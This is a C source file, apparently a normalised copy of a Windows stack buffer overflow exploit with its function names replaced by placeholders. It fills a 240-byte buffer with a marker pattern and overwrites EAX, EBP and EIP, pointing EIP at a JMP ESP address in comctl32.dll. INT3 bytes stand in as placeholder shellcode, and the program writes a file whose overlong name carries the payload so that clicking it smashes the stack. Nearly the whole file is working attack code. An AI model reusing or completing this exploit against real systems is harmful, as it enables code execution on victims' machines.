#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 char* PATH ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC1 (char*,char*) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,char*,char*) ; 

FUNC4(int argc, char *argv[])
{
	char command[1024];
	char exploit[256];

	FILE *hack;
	int i;

	// let's fill the sploit !

    char flag = 'a';
	char fill = 'A';

	for (i=0;i<240;i+=4) //A little trick to easily find what is where in memory.
	{
		exploit[i]=flag;
		exploit[i+1]=fill;
		exploit[i+2]=fill+1;
		exploit[i+3]=fill+2;

		if (++flag=='z')
		{
			flag='a';
			++fill;
		}

	}

	exploit[240]=0x00; //240 bytes is the max, at least on my config.

	//EAX - We control it, but who cares ?
	exploit[127]=(char) 0x50;
	exploit[128]=(char) 0x50;
	exploit[129]=(char) 0x50;
	exploit[130]=(char) 0x50;

	//EBP Nothing cool to do with this one ?
	exploit[135]=(char) 0x60;
	exploit[136]=(char) 0x60;
	exploit[137]=(char) 0x60;
	exploit[138]=(char) 0x60;

	//EIP I use a JMP ESP in comctl32.dll

	exploit[139]=(char) 0x77;
	exploit[140]=(char) 0xAD;
	exploit[141]=(char) 0xB9;
	exploit[142]=(char) 0xBF;
	
	//Shellcode I didn't try anyhting else...work in progress

	
	exploit[163]=(char) 0xCC;
	exploit[164]=(char) 0xCC;
	exploit[165]=(char) 0xCC;

	// Let's do it !

	FUNC3(command,"%s\\AAAA.%s",PATH,exploit);

	hack=FUNC1(command,"w");
	if (hack==NULL)
	{
		FUNC2("Error creating file, sorry !\n");
	}
	else
		FUNC0(hack);
		// Cool, just click the file and you'll smash the stack !
}